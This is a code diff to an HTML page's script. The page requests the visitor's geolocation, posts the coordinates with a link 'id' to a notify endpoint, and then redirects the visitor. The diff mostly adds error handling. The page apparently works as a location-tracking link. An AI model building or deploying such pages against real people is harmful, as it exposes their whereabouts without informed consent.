@@ -13,7 +13,6 @@
     </div>
 </body>
 <script>
-
 const params = new URLSearchParams(window.location.search);
 const queryName = params.get('id');
 const redirectTo = params.get('redirect');
@@ -26,8 +25,8 @@ if (navigator.geolocation) {
 }
 
 async function successCallback(position) {
-    var latitude = position.coords.latitude;
-    var longitude = position.coords.longitude;
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
     console.log("Latitude: " + latitude);
     console.log("Longitude: " + longitude);
     await sendToServer(latitude, longitude, queryName);
@@ -40,25 +39,38 @@ async function errorCallback(error) {
     window.location.href = redirectTo;
 }
 
-async function sendToServer(latitude, longitude){
-    const response = await fetch(`${apiUrl}/api/notify`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({latitude: latitude, longitude: longitude, queryName: queryName, redirectTo: redirectTo}),
-    })
+async function sendToServer(latitude, longitude) {
+    try {
+        const response = await fetch(`${apiUrl}/api/notify`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ latitude: latitude, longitude: longitude, queryName: queryName, redirectTo: redirectTo }),
+        });
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+    } catch (error) {
+        console.error('Error sending data to server:', error);
+    }
 }
 
-async function sendErrorToServer(error){
-    const response = await fetch(`${apiUrl}/api/notify`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({error: error, queryName: queryName, redirectTo: redirectTo}),
-    })
+async function sendErrorToServer(error) {
+    try {
+        const response = await fetch(`${apiUrl}/api/notify`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ error: error, queryName: queryName, redirectTo: redirectTo }),
+        });
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+    } catch (error) {
+        console.error('Error sending error to server:', error);
+    }
 }
-
 </script>
 </html>
